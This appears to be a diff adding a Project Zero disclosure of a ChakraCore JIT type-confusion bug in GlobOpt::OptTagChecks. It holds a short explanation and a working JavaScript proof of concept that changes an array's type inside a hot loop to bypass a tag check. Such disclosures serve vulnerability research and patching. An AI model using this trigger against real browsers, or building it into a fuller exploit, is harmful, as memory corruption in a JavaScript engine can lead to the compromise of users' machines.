@@ -1,0 +1,43 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1365
+
+Some background: https://bugs.chromium.org/p/project-zero/issues/detail?id=1364
+
+There's one more place that emits a BailOnNotObject opcode.
+
+Here's a snippet of GlobOpt::OptTagChecks.
+    if (valueType.CanBeTaggedValue() &&
+        !valueType.HasBeenNumber() &&
+        (this->IsLoopPrePass() || !this->currentBlock->loop))
+    {
+        ValueType newValueType = valueType.SetCanBeTaggedValue(false);
+
+        // Split out the tag check as a separate instruction.
+        IR::Instr *bailOutInstr;
+        bailOutInstr = IR::BailOutInstr::New(Js::OpCode::BailOnNotObject, IR::BailOutOnTaggedValue, instr, instr->m_func);
+        ...
+    }
+
+The JIT compiler analyzes a loop twice for some reasons such as to track types properly. In the first analysis, "IsLoopPrePass" returns true. And it returns false in the second analysis.
+
+But in the above snippet, it emits the bailout opcode in the first analysis("this->IsLoopPrePass()" is satisfied). But the return value of "valueType.HasBeenNumber()" can be different in the second analysis. So it may fail to detect type changes.
+
+PoC:
+*/
+
+function opt() {
+    let obj = [2.3023e-320];
+    for (let i = 0; i < 1; i++) {
+        obj.x = 1;  // In the first analysis, BailOnNotObject emitted
+        obj = +obj;  // Change the type
+        obj.x = 1;  // Type confusion
+    }
+}
+
+function main() {
+    for (let i = 0; i < 1000; i++) {
+        opt();
+    }
+}
+
+main();
